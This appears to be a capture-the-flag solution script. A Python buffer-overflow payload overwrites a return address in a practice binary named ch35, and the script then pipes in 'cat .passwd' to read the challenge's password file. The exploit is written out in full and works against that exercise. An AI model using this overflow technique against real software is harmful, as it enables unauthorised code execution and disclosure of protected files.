# ssh ... < commands.sh

f=$(mktemp)
chmod g+r $f

cat << 'EOF' > $f
import struct
import sys

s = bytearray(b'V' * 255) + b'\x00' #buffer
s += b'W' * 16 #padding for two ints
# leave pops this into rbp, but we don't care
rbp = struct.pack('<Q', 0x0)
# ret pops this into rip
rip = struct.pack('<Q', 0x4005e7)
s += rbp + rip

sys.stdout.buffer.write(s)
EOF

(python3 $f; echo; cat <<< 'cat .passwd') | ./ch35